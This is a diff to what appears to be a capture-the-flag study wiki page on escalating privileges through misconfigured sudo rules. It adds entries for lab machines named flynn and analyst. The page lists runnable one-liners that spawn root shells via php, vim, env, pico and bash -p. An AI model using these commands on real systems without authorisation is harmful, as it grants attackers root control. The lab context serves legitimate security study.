@@ -35,8 +35,10 @@ Exploiting misconfigured `sudo` permissions to escalate privileges.
 - `(ALL) NOPASSWD: /usr/bin/php` → `sudo -u root php -r 'system("/bin/sh -i")'` → root ([[littlepivoting]]).
 - `(ALL) /usr/bin/vim` → `sudo -u root vim` then `:!/bin/bash` → root ([[littlepivoting]]).
 - `(root) NOPASSWD: /usr/bin/env` → `sudo -u root env /bin/bash` → root ([[littlepivoting]]).
+- `(ALL) NOPASSWD: /usr/bin/env` → `sudo /usr/bin/env /bin/sh -p` → root ([[flynn]]).
 - `(hermonine) /usr/bin/pico` → `sudo -u hermonine pico`, then `^R` `^X` → `reset; sh 1>&0 2>&0` → shell as `hermonine` ([[madeyes-castle]]).
+- `(ALL) NOPASSWD: ALL` → `sudo -u root /bin/bash -p` — unrestricted sudo still deserves a `sudo -l` check; there is nothing to abuse, just run the payload directly ([[analyst]]).
 
 ## Seen in
 
-[[hedgehog]], [[trust]], [[obsession]], [[vacaciones]], [[borazuwara]], [[simple-ctf]], [[hannah-coffee]], [[balulero]], [[nodeclimb]], [[psycho]], [[anonymous-pingu]], [[bruteshock]], [[littlepivoting]], [[madeyes-castle]]
+[[hedgehog]], [[trust]], [[obsession]], [[vacaciones]], [[borazuwara]], [[simple-ctf]], [[hannah-coffee]], [[balulero]], [[nodeclimb]], [[psycho]], [[anonymous-pingu]], [[bruteshock]], [[littlepivoting]], [[madeyes-castle]], [[flynn]], [[analyst]]
